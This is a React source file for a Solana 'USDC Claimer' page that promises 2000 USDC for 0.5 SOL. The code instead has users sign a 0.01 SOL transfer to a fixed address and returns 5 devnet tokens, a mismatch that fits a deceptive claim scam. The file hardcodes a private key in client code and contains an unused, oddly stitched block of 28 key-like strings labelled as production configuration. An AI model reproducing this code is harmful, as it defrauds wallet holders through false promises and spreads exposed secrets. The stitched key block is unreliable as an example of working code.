/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "2YGc6LFNnccGQVsPqVNVXqWbPzLgbeY1sFZTNDGKAwnHv2KejURgqkzZfu58TAkAQ2QmT4sbnMCX2qofLh2NM25t"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "5r6uao4e2igeWyC5gGxFWz7ynkF2nrSgNWRMHTKJzmTe198mJiGhddjbpbs6wRCEh34SevtBkByjztjPfHsdrxDJ",
  "key1": "FTHo3yMAxc33uqqAVFDCtgapuwDLProAKzNoQ8UCdEJfrv27HuUsLFScFNwhbNCmNfuWHVHYVfvYsShMVQS6pJA",
  "key2": "3QUbDxKSyTJR4nGyegeWMScSVBKtqDdj9tdxAL5DWLGajjN6mpjwvRNEvofxWyMepg8GrmesJco3WB13WSpnWP4y",
  "key3": "5uXktfkkTCRDM1X8c2qXWdFCwfZqyr9hzVirSbmqbTJ2vr8KqxxNDAy6Hrz8BmqpURMyqiaeMWCvpz8GReS89m7S",
  "key4": "3L9smZwLSK2dQ3qHb5UMeUDs8wPprbm6tbFpGuekHzpnTzLbMarzCEPrbXQwMz7YHJfG6kXR1t9TCd4eiFWGSZde",
  "key5": "374pDESwmAPjJkp6ZzouqQ6tjSPyy1CD1AdZy65w3wtVc2ivzxkYuQn7yU4zwT1G9F54BMKmxjDbiPNadeAEjynf",
  "key6": "5RPFtnfB3LRGxp1WgfKgRyqs6uJnmSjUzBbiLrVo4AdWiy6C4HZmU59NbDtvEfeGLFEYE3yQ2RH1E6HiDAfBzSZh",
  "key7": "4Nbrj7ndUdBX5sZdVm6EkCY93tgUJT5dN9J2XisuF5rEJQnc6gKeXJMBdpNR45RU6Ess3FRib5DDgkXVWnKF5nWw",
  "key8": "3ZPXxQYPAcLtxGfcQ5NkbFAFvBRHhyK4GGPDuF2w8twXh56JLck4rjAzjr2pMqmPnNcq586w9r7aXBMPkA394dFH",
  "key9": "3K2H8nRjdaumTQGPyhzawLxb6KdNsrycMRkpNK9XfAhJQCWWMYXmGW6jBcFG3Li9mbvxKHa9oF3pKEmj1T8YGrYW",
  "key10": "3ZuNFeHraFVeZxzuKzEAqC5DvYYhB7ejMDkrQs7A1sQyomUCsK6eYPFPe1veTsPpYyMKCK6cmz7a5tBo3awtLxm5",
  "key11": "2GUPFdvkzCjC2nPrpVQPpHaaTwPS5XNJepQNTyNXBmZh4qf9N7c887Pw6zCbKVEwXKi7pDPP3ZP81WmQuEs7sUCb",
  "key12": "ZseizVEmHthrKfcAoxu6bPDDaRr7GuvWgr4z6qahPze5VLamtz78CzQTQgRxExxcUEZaNoafW2NtAeM99AVyySK",
  "key13": "5eFCY6QxTkdWoHSyWAHgF7SKCJuZq92rzqtuD5nNHqtvHcZNCHKpkucqwmYNRZSXwdcrkpSmUvb5iMQXPKX94TAV",
  "key14": "3GvMETSdWesSWURzqtiLQTLy4sC8moSkXU7jiRZKJXhFmXNVAbuEX5cVXorZfvTXDHbJa4n4cW8XeB4FPJHP5DQ4",
  "key15": "5B7zGKjyC8FWPWAutY3FtButWgEwibTq6E5FZyWtSgU4vJEhz9DFbtB4LuKtThvVBErugTuhKsog3pJGQdB4a8aW",
  "key16": "5QCKLex7nXNxcCtBBR8XRLas579EDYZgXgVp9rb9DuskS1nCwvLNc1VjoNkk34UbstPTzSAMj9H1e3Sd5oXJyt8q",
  "key17": "5rL6XK6o9S1qK5NK2ZmpyaCea9VptPQZfKdrfHUag4fy8uMDkMjvmCh6cfRJncA9CbTEb95Z5ufLZ2X3xySftbSJ",
  "key18": "5mC5JrL7wQb1yr4UU7nerurNV1jARGFV7gsRAqZrMG5XUgLqUQeQB5dJgbn4e6FhAZHzJ6hL1kUqaCBjrSBBECs7",
  "key19": "3kg18DpB4BchSpabPv7Qe925DEDbfmMqoPqcZ5oCLDEz7wPmDStXytRTjhJuoHXgJYpUGMJ4jkdPFmvdgVbRj8Ge",
  "key20": "2iUnzF9TJZWFRNVKxJ23B8jTieW6JRy7rMdjvyJt89CwPf539W2ysQqoBShuD7BRTWnUNGBNnSAHQWer5S5mM4ke",
  "key21": "2g5f1TFXxUqhgpybqbcwHb7rQDGcSFCfb9x1zy443zQUZhgxBy9Mk46HMCzzPq9Wi2s93bxmxiydPm9aqk1aMTWS",
  "key22": "3hr8rXcSmy5Urjyph1NJEqHUW8kcd2ev53W49b6ECgF7yD3qYCGmj4ntfCGgucv8fbT4r1vBTaRNWmpCWk1hrkNK",
  "key23": "35fD1wvHJ43YVNw4nuqWYhaHJFdFShWX4nHkpAQwMtNDbSpARaWMp46mLzLJrrcM82GpcYA1uNHZWv3cS6PgPPgP",
  "key24": "3xukm6XLDGQ4FGqGbn1VexKHb5jSEqkjRczCMfuv2GyRpoc7pjw8qjTPmrv74GtaNgdZKiYqdi8kWtWmPQcDA3sy",
  "key25": "2j42XconoHJNMkEvw4hz9bHyKt1c3Ka2qF5WAHTsBHCbeLR8LEPRYq8FphYsVWDbVZ7WLAtUWbdmJNXWas4CcQQq",
  "key26": "5ULrPugWFxwDbDhD6HoMB9tZmEcGd1ER5nJ1Xin7AoDdZbnHW58CYkFWvob4WPDeFk2C4R7P6NuFdCCFmgffVZkr",
  "key27": "5fU7cnNABQw9f4kyar6LsZnS8Yzf8XsZw2biPvPWMbHY5PtGYGT35Ssw3euarp33fgVDS8n16RwebrEtb4RZW7EC"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
